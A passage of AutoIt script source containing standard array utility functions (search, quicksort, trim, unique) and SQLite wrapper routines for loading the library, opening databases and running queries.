		Else
			For $I = $ISTART To $IEND Step $ISTEP
				If StringInStr ( $AVARRAY [ $I ] , $VVALUE , $ICASE ) > 0 Then Return $I
			Next
		EndIf
	Case 2
		Local $IUBOUNDSUB = UBound ( $AVARRAY , 2 ) - 1
		If $ISUBITEM > $IUBOUNDSUB Then $ISUBITEM = $IUBOUNDSUB
		If $ISUBITEM < 0 Then
			$ISUBITEM = 0
		Else
			$IUBOUNDSUB = $ISUBITEM
		EndIf
		For $J = $ISUBITEM To $IUBOUNDSUB
			If Not $ICOMPARE Then
				If Not $ICASE Then
					For $I = $ISTART To $IEND Step $ISTEP
						If $ICOMPTYPE And VarGetType ( $AVARRAY [ $I ] [ $J ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
						If $AVARRAY [ $I ] [ $J ] = $VVALUE Then Return $I
					Next
				Else
					For $I = $ISTART To $IEND Step $ISTEP
						If $ICOMPTYPE And VarGetType ( $AVARRAY [ $I ] [ $J ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
						If $AVARRAY [ $I ] [ $J ] == $VVALUE Then Return $I
					Next
				EndIf
			Else
				For $I = $ISTART To $IEND Step $ISTEP
					If StringInStr ( $AVARRAY [ $I ] [ $J ] , $VVALUE , $ICASE ) > 0 Then Return $I
				Next
			EndIf
		Next
Case Else
		Return SetError ( 7 , 0 , - 1 )
	EndSwitch
	Return SetError ( 6 , 0 , - 1 )
EndFunc
Func _ARRAYSORT ( ByRef $AVARRAY , $IDESCENDING = 0 , $ISTART = 0 , $IEND = 0 , $ISUBITEM = 0 )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , 0 )
	Local $IUBOUND = UBound ( $AVARRAY ) - 1
	If $IEND < 1 Or $IEND > $IUBOUND Then $IEND = $IUBOUND
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 2 , 0 , 0 )
	Switch UBound ( $AVARRAY , 0 )
	Case 1
		__ARRAYQUICKSORT1D ( $AVARRAY , $ISTART , $IEND )
		If $IDESCENDING Then _ARRAYREVERSE ( $AVARRAY , $ISTART , $IEND )
	Case 2
		Local $ISUBMAX = UBound ( $AVARRAY , 2 ) - 1
		If $ISUBITEM > $ISUBMAX Then Return SetError ( 3 , 0 , 0 )
		If $IDESCENDING Then
			$IDESCENDING = - 1
		Else
			$IDESCENDING = 1
		EndIf
		__ARRAYQUICKSORT2D ( $AVARRAY , $IDESCENDING , $ISTART , $IEND , $ISUBITEM , $ISUBMAX )
Case Else
		Return SetError ( 4 , 0 , 0 )
	EndSwitch
	Return 1
EndFunc
Func __ARRAYQUICKSORT1D ( ByRef $AVARRAY , ByRef $ISTART , ByRef $IEND )
	If $IEND <= $ISTART Then Return
	Local $VTMP
	If ( $IEND - $ISTART ) < 15 Then
		Local $VCUR
		For $I = $ISTART + 1 To $IEND
			$VTMP = $AVARRAY [ $I ]
			If IsNumber ( $VTMP ) Then
				For $J = $I - 1 To $ISTART Step - 1
					$VCUR = $AVARRAY [ $J ]
					If ( $VTMP >= $VCUR And IsNumber ( $VCUR ) ) Or ( Not IsNumber ( $VCUR ) And StringCompare ( $VTMP , $VCUR ) >= 0 ) Then ExitLoop
					$AVARRAY [ $J + 1 ] = $VCUR
				Next
			Else
				For $J = $I - 1 To $ISTART Step - 1
					If ( StringCompare ( $VTMP , $AVARRAY [ $J ] ) >= 0 ) Then ExitLoop
					$AVARRAY [ $J + 1 ] = $AVARRAY [ $J ]
				Next
			EndIf
			$AVARRAY [ $J + 1 ] = $VTMP
		Next
		Return
	EndIf
	Local $L = $ISTART , $R = $IEND , $VPIVOT = $AVARRAY [ Int ( ( $ISTART + $IEND ) / 2 ) ] , $FNUM = IsNumber ( $VPIVOT )
	Do
		If $FNUM Then
			While ( $AVARRAY [ $L ] < $VPIVOT And IsNumber ( $AVARRAY [ $L ] ) ) Or ( Not IsNumber ( $AVARRAY [ $L ] ) And StringCompare ( $AVARRAY [ $L ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( $AVARRAY [ $R ] > $VPIVOT And IsNumber ( $AVARRAY [ $R ] ) ) Or ( Not IsNumber ( $AVARRAY [ $R ] ) And StringCompare ( $AVARRAY [ $R ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		Else
			While ( StringCompare ( $AVARRAY [ $L ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( StringCompare ( $AVARRAY [ $R ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		EndIf
		If $L <= $R Then
			$VTMP = $AVARRAY [ $L ]
			$AVARRAY [ $L ] = $AVARRAY [ $R ]
			$AVARRAY [ $R ] = $VTMP
			$L += 1
			$R -= 1
		EndIf
	Until $L > $R
	__ARRAYQUICKSORT1D ( $AVARRAY , $ISTART , $R )
	__ARRAYQUICKSORT1D ( $AVARRAY , $L , $IEND )
EndFunc
Func __ARRAYQUICKSORT2D ( ByRef $AVARRAY , ByRef $ISTEP , ByRef $ISTART , ByRef $IEND , ByRef $ISUBITEM , ByRef $ISUBMAX )
	If $IEND <= $ISTART Then Return
	Local $VTMP , $L = $ISTART , $R = $IEND , $VPIVOT = $AVARRAY [ Int ( ( $ISTART + $IEND ) / 2 ) ] [ $ISUBITEM ] , $FNUM = IsNumber ( $VPIVOT )
	Do
		If $FNUM Then
			While ( $ISTEP * ( $AVARRAY [ $L ] [ $ISUBITEM ] - $VPIVOT ) < 0 And IsNumber ( $AVARRAY [ $L ] [ $ISUBITEM ] ) ) Or ( Not IsNumber ( $AVARRAY [ $L ] [ $ISUBITEM ] ) And $ISTEP * StringCompare ( $AVARRAY [ $L ] [ $ISUBITEM ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( $ISTEP * ( $AVARRAY [ $R ] [ $ISUBITEM ] - $VPIVOT ) > 0 And IsNumber ( $AVARRAY [ $R ] [ $ISUBITEM ] ) ) Or ( Not IsNumber ( $AVARRAY [ $R ] [ $ISUBITEM ] ) And $ISTEP * StringCompare ( $AVARRAY [ $R ] [ $ISUBITEM ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		Else
			While ( $ISTEP * StringCompare ( $AVARRAY [ $L ] [ $ISUBITEM ] , $VPIVOT ) < 0 )
				$L += 1
			WEnd
			While ( $ISTEP * StringCompare ( $AVARRAY [ $R ] [ $ISUBITEM ] , $VPIVOT ) > 0 )
				$R -= 1
			WEnd
		EndIf
		If $L <= $R Then
			For $I = 0 To $ISUBMAX
				$VTMP = $AVARRAY [ $L ] [ $I ]
				$AVARRAY [ $L ] [ $I ] = $AVARRAY [ $R ] [ $I ]
				$AVARRAY [ $R ] [ $I ] = $VTMP
			Next
			$L += 1
			$R -= 1
		EndIf
	Until $L > $R
	__ARRAYQUICKSORT2D ( $AVARRAY , $ISTEP , $ISTART , $R , $ISUBITEM , $ISUBMAX )
	__ARRAYQUICKSORT2D ( $AVARRAY , $ISTEP , $L , $IEND , $ISUBITEM , $ISUBMAX )
EndFunc
Func _ARRAYSWAP ( ByRef $VITEM1 , ByRef $VITEM2 )
	Local $VTMP = $VITEM1
	$VITEM1 = $VITEM2
	$VITEM2 = $VTMP
EndFunc
Func _ARRAYTOCLIP ( Const ByRef $AVARRAY , $ISTART = 0 , $IEND = 0 )
	Local $SRESULT = _ARRAYTOSTRING ( $AVARRAY , @CR , $ISTART , $IEND )
	If @error Then Return SetError ( @error , 0 , 0 )
	Return ClipPut ( $SRESULT )
EndFunc
Func _ARRAYTOSTRING ( Const ByRef $AVARRAY , $SDELIM = "|" , $ISTART = 0 , $IEND = 0 )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , "" )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 3 , 0 , "" )
	Local $SRESULT , $IUBOUND = UBound ( $AVARRAY ) - 1
	If $IEND < 1 Or $IEND > $IUBOUND Then $IEND = $IUBOUND
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 2 , 0 , "" )
	For $I = $ISTART To $IEND
		$SRESULT &= $AVARRAY [ $I ] & $SDELIM
	Next
	Return StringTrimRight ( $SRESULT , StringLen ( $SDELIM ) )
EndFunc
Func _ARRAYTRIM ( ByRef $AVARRAY , $ITRIMNUM , $IDIRECTION = 0 , $ISTART = 0 , $IEND = 0 )
	If Not IsArray ( $AVARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AVARRAY , 0 ) <> 1 Then Return SetError ( 2 , 0 , 0 )
	Local $IUBOUND = UBound ( $AVARRAY ) - 1
	If $IEND < 1 Or $IEND > $IUBOUND Then $IEND = $IUBOUND
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 5 , 0 , 0 )
	If $IDIRECTION Then
		For $I = $ISTART To $IEND
			$AVARRAY [ $I ] = StringTrimRight ( $AVARRAY [ $I ] , $ITRIMNUM )
		Next
	Else
		For $I = $ISTART To $IEND
			$AVARRAY [ $I ] = StringTrimLeft ( $AVARRAY [ $I ] , $ITRIMNUM )
		Next
	EndIf
	Return 1
EndFunc
Func _ARRAYUNIQUE ( $AARRAY , $IDIMENSION = 1 , $IBASE = 0 , $ICASE = 0 , $VDELIM = "|" )
	Local $IUBOUNDDIM
	If $VDELIM = "|" Then $VDELIM = Chr ( 1 )
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If Not $IDIMENSION > 0 Then
		Return SetError ( 3 , 0 , 0 )
	Else
		$IUBOUNDDIM = UBound ( $AARRAY , 1 )
		If @error Then Return SetError ( 3 , 0 , 0 )
		If $IDIMENSION > 1 Then
			Local $AARRAYTMP [ 1 ]
			For $I = 0 To $IUBOUNDDIM - 1
				_ARRAYADD ( $AARRAYTMP , $AARRAY [ $I ] [ $IDIMENSION - 1 ] )
			Next
			_ARRAYDELETE ( $AARRAYTMP , 0 )
		Else
			If UBound ( $AARRAY , 0 ) = 1 Then
				Dim $AARRAYTMP [ 1 ]
				For $I = 0 To $IUBOUNDDIM - 1
					_ARRAYADD ( $AARRAYTMP , $AARRAY [ $I ] )
				Next
				_ARRAYDELETE ( $AARRAYTMP , 0 )
			Else
				Dim $AARRAYTMP [ 1 ]
				For $I = 0 To $IUBOUNDDIM - 1
					_ARRAYADD ( $AARRAYTMP , $AARRAY [ $I ] [ $IDIMENSION - 1 ] )
				Next
				_ARRAYDELETE ( $AARRAYTMP , 0 )
			EndIf
		EndIf
	EndIf
	Local $SHOLD
	For $ICC = $IBASE To UBound ( $AARRAYTMP ) - 1
		If Not StringInStr ( $VDELIM & $SHOLD , $VDELIM & $AARRAYTMP [ $ICC ] & $VDELIM , $ICASE ) Then $SHOLD &= $AARRAYTMP [ $ICC ] & $VDELIM
	Next
	If $SHOLD Then
		$AARRAYTMP = StringSplit ( StringTrimRight ( $SHOLD , StringLen ( $VDELIM ) ) , $VDELIM , 1 )
		Return $AARRAYTMP
	EndIf
	Return SetError ( 2 , 0 , 0 )
EndFunc
Func __ARRAY_EXETERINTERNAL ( ByRef $AVARRAY , $ISTART , $ISIZE , $SDELIM , ByRef $AIDX , ByRef $ARESULT , ByRef $ICOUNT )
	If $ISTART == $ISIZE - 1 Then
		For $I = 0 To $ISIZE - 1
			$ARESULT [ $ICOUNT ] &= $AVARRAY [ $AIDX [ $I ] ] & $SDELIM
		Next
		If $SDELIM <> "" Then $ARESULT [ $ICOUNT ] = StringTrimRight ( $ARESULT [ $ICOUNT ] , 1 )
		$ICOUNT += 1
	Else
		Local $ITEMP
		For $I = $ISTART To $ISIZE - 1
			$ITEMP = $AIDX [ $I ]
			$AIDX [ $I ] = $AIDX [ $ISTART ]
			$AIDX [ $ISTART ] = $ITEMP
			__ARRAY_EXETERINTERNAL ( $AVARRAY , $ISTART + 1 , $ISIZE , $SDELIM , $AIDX , $ARESULT , $ICOUNT )
			$AIDX [ $ISTART ] = $AIDX [ $I ]
			$AIDX [ $I ] = $ITEMP
		Next
	EndIf
EndFunc
Func __ARRAY_COMBINATIONS ( $IN , $IR )
	Local $I_TOTAL = 1
	For $I = $IR To 1 Step - 1
		$I_TOTAL *= ( $IN / $I )
		$IN -= 1
	Next
	Return Round ( $I_TOTAL )
EndFunc
Func __ARRAY_GETNEXT ( $IN , $IR , ByRef $ILEFT , $ITOTAL , ByRef $AIDX )
	If $ILEFT == $ITOTAL Then
		$ILEFT -= 1
		Return
	EndIf
	Local $I = $IR - 1
	While $AIDX [ $I ] == $IN - $IR + $I
		$I -= 1
	WEnd
	$AIDX [ $I ] += 1
	For $J = $I + 1 To $IR - 1
		$AIDX [ $J ] = $AIDX [ $I ] + $J - $I
	Next
	$ILEFT -= 1
EndFunc
#IgnoreFunc __SQLite_Inline_Version, __SQLite_Inline_Modified
Global Const $SQLITE_OK = 0
Global Const $SQLITE_ERROR = 1
Global Const $SQLITE_INTERNAL = 2
Global Const $SQLITE_PERM = 3
Global Const $SQLITE_ABORT = 4
Global Const $SQLITE_BUSY = 5
Global Const $SQLITE_LOCKED = 6
Global Const $SQLITE_NOMEM = 7
Global Const $SQLITE_READONLY = 8
Global Const $SQLITE_INTERRUPT = 9
Global Const $SQLITE_IOERR = 10
Global Const $SQLITE_CORRUPT = 11
Global Const $SQLITE_NOTFOUND = 12
Global Const $SQLITE_FULL = 13
Global Const $SQLITE_CANTOPEN = 14
Global Const $SQLITE_PROTOCOL = 15
Global Const $SQLITE_EMPTY = 16
Global Const $SQLITE_SCHEMA = 17
Global Const $SQLITE_TOOBIG = 18
Global Const $SQLITE_CONSTRAINT = 19
Global Const $SQLITE_MISMATCH = 20
Global Const $SQLITE_MISUSE = 21
Global Const $SQLITE_NOLFS = 22
Global Const $SQLITE_AUTH = 23
Global Const $SQLITE_ROW = 100
Global Const $SQLITE_DONE = 101
Global Const $SQLITE_OPEN_READONLY = 1
Global Const $SQLITE_OPEN_READWRITE = 2
Global Const $SQLITE_OPEN_CREATE = 4
Global Const $SQLITE_ENCODING_UTF8 = 0
Global Const $SQLITE_ENCODING_UTF16 = 1
Global Const $SQLITE_ENCODING_UTF16BE = 2
Global Const $SQLITE_TYPE_INTEGER = 1
Global Const $SQLITE_TYPE_FLOAT = 2
Global Const $SQLITE_TYPE_TEXT = 3
Global Const $SQLITE_TYPE_BLOB = 4
Global Const $SQLITE_TYPE_NULL = 5
Global $G_HDLL_SQLITE = 0
Global $G_HDB_SQLITE = 0
Global $G_BUTF8ERRORMSG_SQLITE = False
Global $G_SPRINTCALLBACK_SQLITE = "__SQLite_ConsoleWrite"
Global $__GBSAFEMODESTATE_SQLITE = True
Global $__GHDBS_SQLITE [ 1 ] = [ "" ]
Global $__GHQUERYS_SQLITE [ 1 ] = [ "" ]
Global $__GHMSVCRTDLL_SQLITE = 0
Global $__GATEMPFILES_SQLITE [ 1 ] = [ "" ]
Func _SQLITE_STARTUP ( $SDLL_FILENAME = "" , $BUTF8ERRORMSG = False , $BFORCELOCAL = 0 , $SPRINTCALLBACK = $G_SPRINTCALLBACK_SQLITE )
	$G_SPRINTCALLBACK_SQLITE = $SPRINTCALLBACK
	If IsKeyword ( $BUTF8ERRORMSG ) Then $BUTF8ERRORMSG = False
	$G_BUTF8ERRORMSG_SQLITE = $BUTF8ERRORMSG
	If IsKeyword ( $SDLL_FILENAME ) Or $BFORCELOCAL Or $SDLL_FILENAME = "" Or $SDLL_FILENAME = - 1 Then
		Local $BDOWNLOADDLL = True
		Local $VINLINEVERSION = Call ( "__SQLite_Inline_Version" )
		If $BFORCELOCAL Then
			If @AutoItX64 And StringInStr ( $SDLL_FILENAME , "_x64" ) Then $SDLL_FILENAME = StringReplace ( $SDLL_FILENAME , ".dll" , "_x64.dll" )
			$BDOWNLOADDLL = ( $BFORCELOCAL < 0 )
		Else
			If @AutoItX64 = 0 Then
				$SDLL_FILENAME = "sqlite3.dll"
			Else
				$SDLL_FILENAME = "sqlite3_x64.dll"
			EndIf
			If @error Then $BDOWNLOADDLL = False
			If __SQLITE_VERSCMP ( @ScriptDir & "\" & $SDLL_FILENAME , $VINLINEVERSION ) = $SQLITE_OK Then
				$SDLL_FILENAME = @ScriptDir & "\" & $SDLL_FILENAME
				$BDOWNLOADDLL = False
			ElseIf __SQLITE_VERSCMP ( @SystemDir & "\" & $SDLL_FILENAME , $VINLINEVERSION ) = $SQLITE_OK Then
				$SDLL_FILENAME = @SystemDir & "\" & $SDLL_FILENAME
				$BDOWNLOADDLL = False
			ElseIf __SQLITE_VERSCMP ( @WindowsDir & "\" & $SDLL_FILENAME , $VINLINEVERSION ) = $SQLITE_OK Then
				$SDLL_FILENAME = @WindowsDir & "\" & $SDLL_FILENAME
				$BDOWNLOADDLL = False
			ElseIf __SQLITE_VERSCMP ( @WorkingDir & "\" & $SDLL_FILENAME , $VINLINEVERSION ) = $SQLITE_OK Then
				$SDLL_FILENAME = @WorkingDir & "\" & $SDLL_FILENAME
				$BDOWNLOADDLL = False
			EndIf
		EndIf
		If $BDOWNLOADDLL Then
			If FileExists ( $SDLL_FILENAME ) Or $SDLL_FILENAME = "" Then
				$SDLL_FILENAME = _TEMPFILE ( @TempDir , "~" , ".dll" )
				_ARRAYADD ( $__GATEMPFILES_SQLITE , $SDLL_FILENAME )
				OnAutoItExitRegister ( "_SQLite_Shutdown" )
			Else
				$SDLL_FILENAME = @SystemDir & "\" & $SDLL_FILENAME
			EndIf
			If $BFORCELOCAL Then
				$VINLINEVERSION = ""
			Else
				$VINLINEVERSION = "_" & $VINLINEVERSION
			EndIf
			__SQLITE_DOWNLOAD_SQLITE3DLL ( $SDLL_FILENAME , $VINLINEVERSION )
		EndIf
	EndIf
	Local $HDLL = DllOpen ( $SDLL_FILENAME )
	If $HDLL = - 1 Then
		$G_HDLL_SQLITE = 0
		Return SetError ( 1 , 0 , "" )
	Else
		$G_HDLL_SQLITE = $HDLL
		Return $SDLL_FILENAME
	EndIf
EndFunc
Func _SQLITE_SHUTDOWN ( )
	If $G_HDLL_SQLITE > 0 Then DllClose ( $G_HDLL_SQLITE )
	$G_HDLL_SQLITE = 0
	If $__GHMSVCRTDLL_SQLITE > 0 Then DllClose ( $__GHMSVCRTDLL_SQLITE )
	$__GHMSVCRTDLL_SQLITE = 0
	For $STEMPFILE In $__GATEMPFILES_SQLITE
		If FileExists ( $STEMPFILE ) Then FileDelete ( $STEMPFILE )
	Next
	OnAutoItExitUnRegister ( "_SQLite_Shutdown" )
EndFunc
Func _SQLITE_OPEN ( $SDATABASE_FILENAME = Default , $IACCESSMODE = Default , $IENCODING = Default )
	If Not $G_HDLL_SQLITE Then Return SetError ( 3 , $SQLITE_MISUSE , 0 )
	If IsKeyword ( $SDATABASE_FILENAME ) Or Not IsString ( $SDATABASE_FILENAME ) Then $SDATABASE_FILENAME = ":memory:"
	Local $TFILENAME = __SQLITE_STRINGTOUTF8STRUCT ( $SDATABASE_FILENAME )
	If @error Then Return SetError ( 2 , @error , 0 )
	If IsKeyword ( $IACCESSMODE ) Then $IACCESSMODE = BitOR ( $SQLITE_OPEN_READWRITE , $SQLITE_OPEN_CREATE )
	Local $OLDBASE = FileExists ( $SDATABASE_FILENAME )
	If IsKeyword ( $IENCODING ) Then
		$IENCODING = $SQLITE_ENCODING_UTF8
	EndIf
	Local $AVRVAL = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_open_v2" , "struct*" , $TFILENAME , "long*" , 0 , "int" , $IACCESSMODE , "ptr" , 0 )
	If @error Then Return SetError ( 1 , @error , 0 )
	If $AVRVAL [ 0 ] <> $SQLITE_OK Then
		__SQLITE_REPORTERROR ( $AVRVAL [ 2 ] , "_SQLite_Open" )
		_SQLITE_CLOSE ( $AVRVAL [ 2 ] )
		Return SetError ( - 1 , $AVRVAL [ 0 ] , 0 )
	EndIf
	$G_HDB_SQLITE = $AVRVAL [ 2 ]
	__SQLITE_HADD ( $__GHDBS_SQLITE , $AVRVAL [ 2 ] )
	If Not $OLDBASE Then
		Local $ENCODING [ 3 ] = [ "8" , "16" , "16be" ]
		_SQLITE_EXEC ( $AVRVAL [ 2 ] , "PRAGMA encoding=""UTF-" & $ENCODING [ $IENCODING ] & """;" )
	EndIf
	Return SetExtended ( $AVRVAL [ 0 ] , $AVRVAL [ 2 ] )
EndFunc
Func _SQLITE_GETTABLE ( $HDB , $SSQL , ByRef $ARESULT , ByRef $IROWS , ByRef $ICOLUMNS , $ICHARSIZE = - 1 )
	$ARESULT = ""
	If __SQLITE_HCHK ( $HDB , 1 ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	If $ICHARSIZE = "" Or $ICHARSIZE < 1 Or IsKeyword ( $ICHARSIZE ) Then $ICHARSIZE = - 1
	Local $HQUERY
	Local $R = _SQLITE_QUERY ( $HDB , $SSQL , $HQUERY )
	If @error Then Return SetError ( 2 , @error , $R )
	Local $ADATAROW
	$R = _SQLITE_FETCHNAMES ( $HQUERY , $ADATAROW )
	Local $ERR = @error
	If $ERR Then
		_SQLITE_QUERYFINALIZE ( $HQUERY )
		Return SetError ( 3 , $ERR , $R )
	EndIf
	$ICOLUMNS = UBound ( $ADATAROW )
	Local Const $IROWSINCR = 64
	$IROWS = 0
	Local $IALLOCROWS = $IROWSINCR
	Dim $ARESULT [ ( $IALLOCROWS + 1 ) * $ICOLUMNS + 1 ]
	For $IDX = 0 To $ICOLUMNS - 1
		If $ICHARSIZE > 0 Then
			$ADATAROW [ $IDX ] = StringLeft ( $ADATAROW [ $IDX ] , $ICHARSIZE )
		EndIf
		$ARESULT [ $IDX + 1 ] = $ADATAROW [ $IDX ]
	Next
	While 1
		$R = _SQLITE_FETCHDATA ( $HQUERY , $ADATAROW , 0 , 0 , $ICOLUMNS )
		$ERR = @error
		Switch $R
		Case $SQLITE_OK
			$IROWS += 1
			If $IROWS = $IALLOCROWS Then
				$IALLOCROWS = Round ( $IALLOCROWS * 4 / 3 )
				ReDim $ARESULT [ ( $IALLOCROWS + 1 ) * $ICOLUMNS + 1 ]
			EndIf
			For $J = 0 To $ICOLUMNS - 1
				If $ICHARSIZE > 0 Then
					$ADATAROW [ $J ] = StringLeft ( $ADATAROW [ $J ] , $ICHARSIZE )
				EndIf
				$IDX += 1
				$ARESULT [ $IDX ] = $ADATAROW [ $J ]
			Next
		Case $SQLITE_DONE
			ExitLoop
	Case Else
			$ARESULT = ""
			_SQLITE_QUERYFINALIZE ( $HQUERY )
			Return SetError ( 4 , $ERR , $R )
		EndSwitch
	WEnd
	$ARESULT [ 0 ] = ( $IROWS + 1 ) * $ICOLUMNS
	ReDim $ARESULT [ $ARESULT [ 0 ] + 1 ]
	Return ( $SQLITE_OK )
EndFunc
Func _SQLITE_EXEC ( $HDB , $SSQL , $SCALLBACK = "" )
	If __SQLITE_HCHK ( $HDB , 2 ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	If $SCALLBACK <> "" Then
		Local $IROWS , $ICOLUMNS
		Local $ARESULT = "SQLITE_CALLBACK:" & $SCALLBACK
		Local $IRVAL = _SQLITE_GETTABLE2D ( $HDB , $SSQL , $ARESULT , $IROWS , $ICOLUMNS )
		If @error Then Return SetError ( 3 , @error , $IRVAL )
		Return $IRVAL
	EndIf
	Local $TSQL8 = __SQLITE_STRINGTOUTF8STRUCT ( $SSQL )
	If @error Then Return SetError ( 4 , @error , 0 )
	Local $AVRVAL = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_exec" , "ptr" , $HDB , "struct*" , $TSQL8 , "ptr" , 0 , "ptr" , 0 , "long*" , 0 )
	If @error Then Return SetError ( 1 , @error , $SQLITE_MISUSE )
	__SQLITE_SZFREE ( $AVRVAL [ 5 ] )
	If $AVRVAL [ 0 ] <> $SQLITE_OK Then
		__SQLITE_REPORTERROR ( $HDB , "_SQLite_Exec" , $SSQL )
		SetError ( - 1 )
	EndIf
	Return $AVRVAL [ 0 ]
EndFunc
Func _SQLITE_LIBVERSION ( )
	If $G_HDLL_SQLITE = 0 Then Return SetError ( 1 , $SQLITE_MISUSE , 0 )
	Local $R = DllCall ( $G_HDLL_SQLITE , "str:cdecl" , "sqlite3_libversion" )
	If @error Then Return SetError ( 1 , @error , 0 )
	Return $R [ 0 ]
EndFunc
Func _SQLITE_LASTINSERTROWID ( $HDB = - 1 )
	If __SQLITE_HCHK ( $HDB , 2 ) Then Return SetError ( @error , @extended , 0 )
	Local $R = DllCall ( $G_HDLL_SQLITE , "long:cdecl" , "sqlite3_last_insert_rowid" , "ptr" , $HDB )
	If @error Then Return SetError ( 1 , @error , 0 )
	Return $R [ 0 ]
EndFunc
Func _SQLITE_CHANGES ( $HDB = - 1 )
	If __SQLITE_HCHK ( $HDB , 2 ) Then Return SetError ( @error , @extended , 0 )
	Local $R = DllCall ( $G_HDLL_SQLITE , "long:cdecl" , "sqlite3_changes" , "ptr" , $HDB )
	If @error Then Return SetError ( 1 , @error , 0 )
	Return $R [ 0 ]
EndFunc
Func _SQLITE_TOTALCHANGES ( $HDB = - 1 )
	If __SQLITE_HCHK ( $HDB , 2 ) Then Return SetError ( @error , @extended , 0 )
	Local $R = DllCall ( $G_HDLL_SQLITE , "long:cdecl" , "sqlite3_total_changes" , "ptr" , $HDB )
	If @error Then Return SetError ( 1 , @error , 0 )
	Return $R [ 0 ]
EndFunc
Func _SQLITE_ERRCODE ( $HDB = - 1 )
	If __SQLITE_HCHK ( $HDB , 2 ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	Local $R = DllCall ( $G_HDLL_SQLITE , "long:cdecl" , "sqlite3_errcode" , "ptr" , $HDB )
	If @error Then Return SetError ( 1 , @error , $SQLITE_MISUSE )
	Return $R [ 0 ]
EndFunc
Func _SQLITE_ERRMSG ( $HDB = - 1 )
	If __SQLITE_HCHK ( $HDB , 2 ) Then Return SetError ( @error , @extended , "Library used incorrectly" )
	Local $R = DllCall ( $G_HDLL_SQLITE , "wstr:cdecl" , "sqlite3_errmsg16" , "ptr" , $HDB )
	If @error Then
		__SQLITE_REPORTERROR ( $HDB , "_SQLite_ErrMsg" , Default , "Call Failed" )
		Return SetError ( 1 , @error , "Library used incorrectly" )
	EndIf
	Return $R [ 0 ]
EndFunc
Func _SQLITE_DISPLAY2DRESULT ( $ARESULT , $ICELLWIDTH = 0 , $BRETURN = False )
	If Not IsArray ( $ARESULT ) Or UBound ( $ARESULT , 0 ) <> 2 Or $ICELLWIDTH < 0 Then Return SetError ( 1 , 0 , "" )
	Local $AICELLWIDTH
	If $ICELLWIDTH = 0 Or IsKeyword ( $ICELLWIDTH ) Then
		Local $ICELLWIDTHMAX
		Dim $AICELLWIDTH [ UBound ( $ARESULT , 2 ) ]
		For $IROW = 0 To UBound ( $ARESULT , 1 ) - 1
			For $ICOL = 0 To UBound ( $ARESULT , 2 ) - 1
				$ICELLWIDTHMAX = StringLen ( $ARESULT [ $IROW ] [ $ICOL ] )
				If $ICELLWIDTHMAX > $AICELLWIDTH [ $ICOL ] Then
					$AICELLWIDTH [ $ICOL ] = $ICELLWIDTHMAX
				EndIf
			Next
		Next
	EndIf
	Local $SOUT = "" , $ICELLWIDTHUSED
	For $IROW = 0 To UBound ( $ARESULT , 1 ) - 1
		For $ICOL = 0 To UBound ( $ARESULT , 2 ) - 1
			If $ICELLWIDTH = 0 Then
				$ICELLWIDTHUSED = $AICELLWIDTH [ $ICOL ]
			Else
				$ICELLWIDTHUSED = $ICELLWIDTH
			EndIf
			$SOUT &= StringFormat ( " %-" & $ICELLWIDTHUSED & "." & $ICELLWIDTHUSED & "s " , $ARESULT [ $IROW ] [ $ICOL ] )
		Next
		$SOUT &= @CRLF
		If Not $BRETURN Then
			__SQLITE_PRINT ( $SOUT )
			$SOUT = ""
		EndIf
	Next
	If $BRETURN Then Return $SOUT
EndFunc
Func _SQLITE_GETTABLE2D ( $HDB , $SSQL , ByRef $ARESULT , ByRef $IROWS , ByRef $ICOLUMNS , $ICHARSIZE = - 1 , $FSWICHDIMENSIONS = False )
	If __SQLITE_HCHK ( $HDB , 1 ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	If $ICHARSIZE = "" Or $ICHARSIZE < 1 Or IsKeyword ( $ICHARSIZE ) Then $ICHARSIZE = - 1
	Local $SCALLBACK = "" , $FCALLBACK = False
	If IsString ( $ARESULT ) Then
		If StringLeft ( $ARESULT , 16 ) = "SQLITE_CALLBACK:" Then
			$SCALLBACK = StringTrimLeft ( $ARESULT , 16 )
			$FCALLBACK = True
		EndIf
	EndIf
	$ARESULT = ""
	If IsKeyword ( $FSWICHDIMENSIONS ) Then $FSWICHDIMENSIONS = False
	Local $HQUERY
	Local $R = _SQLITE_QUERY ( $HDB , $SSQL , $HQUERY )
	If @error Then Return SetError ( 2 , @error , $R )
	If $R <> $SQLITE_OK Then
		__SQLITE_REPORTERROR ( $HDB , "_SQLite_GetTable2d" , $SSQL )
		_SQLITE_QUERYFINALIZE ( $HQUERY )
		Return SetError ( - 1 , 0 , $R )
	EndIf
	$IROWS = 0
	Local $IRVAL_STEP , $ERR
	While True
		$IRVAL_STEP = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_step" , "ptr" , $HQUERY )
		If @error Then
			$ERR = @error
			_SQLITE_QUERYFINALIZE ( $HQUERY )
			Return SetError ( 3 , $ERR , $SQLITE_MISUSE )
		EndIf
		Switch $IRVAL_STEP [ 0 ]
		Case $SQLITE_ROW
			$IROWS += 1
		Case $SQLITE_DONE
			ExitLoop
	Case Else
			_SQLITE_QUERYFINALIZE ( $HQUERY )
			Return SetError ( 3 , $ERR , $IRVAL_STEP [ 0 ] )
		EndSwitch
	WEnd
	Local $RET = _SQLITE_QUERYRESET ( $HQUERY )
	If @error Then
		$ERR = @error
		_SQLITE_QUERYFINALIZE ( $HQUERY )
